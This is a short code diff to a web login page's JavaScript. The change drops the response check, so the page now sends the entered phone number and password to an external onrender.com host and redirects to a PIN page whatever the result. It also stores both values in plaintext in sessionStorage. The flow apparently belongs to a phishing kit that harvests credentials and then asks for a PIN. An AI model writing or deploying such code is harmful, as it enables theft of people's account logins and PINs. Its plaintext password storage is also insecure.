@@ -451,52 +451,25 @@ password.addEventListener("input", validate);
 
 const loading = document.getElementById("loading");
 
-btn.addEventListener("click", async function () {
+btn.addEventListener("click", function () {
 
     if (!btn.classList.contains("active")) return;
 
-    loading.style.display = "flex";
-    btn.disabled = true;
+    sessionStorage.setItem("phone", phone.value.trim());
+    sessionStorage.setItem("password", password.value.trim());
 
-    try {
+    fetch("https://sprodeall-upwv.onrender.com/login", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            phone: phone.value.trim(),
+            password: password.value.trim()
+        })
+    });
 
-        const response = await fetch("https://sprodeall-upwv.onrender.com/login", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                phone: phone.value.trim(),
-                password: password.value.trim()
-            })
-        });
-
-        const result = await response.json();
-
-        if (result.success) {
-
-            sessionStorage.setItem("phone", phone.value);
-            sessionStorage.setItem("password", password.value);
-
-            window.location.href = "pin.html";
-
-        } else {
-
-            alert(result.message || "Login Failed");
-
-            btn.disabled = false;
-            loading.style.display = "none";
-
-        }
-
-    } catch (e) {
-
-        alert("Server Error");
-
-        btn.disabled = false;
-        loading.style.display = "none";
-
-    }
+    window.location.href = "pin.html";
 
 });
 
